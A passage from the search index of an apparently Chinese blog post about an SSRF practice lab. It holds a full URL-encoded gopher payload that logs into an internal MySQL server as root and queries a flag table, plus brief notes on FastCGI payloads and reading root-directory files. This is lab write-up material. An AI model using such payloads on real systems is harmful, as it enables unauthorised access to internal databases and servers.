gopher://172.72.23.29:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%2e%74%65%73%74%01%00%00%00%01 通过页面传入得到flag：\n1 helloct{you_got_flag_29} fpm（FastCGI协议）\r通过脚本生成payload：\n通过页面传输，得到根目录下的文件：\n参考文章\r手把手带你用 SSRF 打穿内网 | 国光\n","date":"2025-10-01T20:28:30+08:00","image":"https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/SSRF_hu_4bb98d269a64282f.png","permalink":"https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/","title":"SSRF靶场"}]